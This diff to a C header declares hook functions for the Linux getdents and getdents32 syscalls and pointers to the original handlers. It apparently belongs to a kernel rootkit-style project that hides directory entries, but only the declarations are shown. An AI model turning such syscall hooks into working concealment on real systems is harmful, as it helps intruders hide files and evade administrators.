@@ -17,7 +17,9 @@ struct linux_dirent {
 
 
 // Functions
-asmlinkage long sys_getdents_hook(const struct pt_regs * regs);
-extern asmlinkage long (*original_getdents) (const struct pt_regs * regs);
+extern asmlinkage long sys_getdents_hook(const struct pt_regs * regs);
+extern asmlinkage long sys_getdents32_hook(const struct pt_regs * regs);
+extern asmlinkage long (*original_getdents) (const struct pt_regs *);
+extern asmlinkage long (*original_getdents_32)(const struct pt_regs *);
 
 #endif
